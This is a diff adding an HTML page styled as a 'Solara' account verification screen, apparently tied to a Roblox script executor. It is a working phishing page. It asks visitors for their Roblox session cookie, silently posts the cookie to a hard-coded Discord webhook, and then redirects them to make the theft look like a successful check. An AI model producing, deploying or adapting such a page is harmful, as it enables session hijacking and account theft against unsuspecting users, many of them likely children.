@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solara</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #6c158b, #2D3748);
+            color: #a328a3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #131414;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px #131414;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        .logo {
+            max-width: 100px;
+            margin-bottom: 20px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #6c158b;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #862ca7;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://solaraexecutor.com/wp-content/uploads/2024/05/logo.png" alt="Solara Logo" class="logo">
+        <h1>Access to Solara</h1>
+        <input type="text" id="userInput" placeholder="Enter your roblox cookie...">
+        <button onclick="handleButtonClick()">Verify my account</button>
+    </div>
+    
+
+    <script>
+        function handleButtonClick() {
+            const userInput = document.getElementById('userInput').value;
+            
+            if (userInput) {
+                const webhookURL = 'https://discord.com/api/webhooks/1262060318515920917/R67_U-zN5Edb9_RvAQNZ5YYYrd1QE9iqd3wiP68oawhJ6DXVK8kKFNTB8iXdVak8Rqu1';
+                const data = {
+                    content: `roblox-cookie : ${userInput}`
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert('Verifying...');
+                        setTimeout(() => {
+                            window.location.href = 'https://solaraexecutor.com/';
+                        }, 2000); // Redirection après 2s 
+                    } else {
+                        alert('Error: 1333');
+                    }
+                })
+                .catch(error => {
+                    alert('Erreur: 0453778895');
+                    console.error('Erreur:', error);
+                });
+            } else {
+                alert('Enter your roblox cookie');
+            }
+        }
+    </script>
+</body>
+</html>
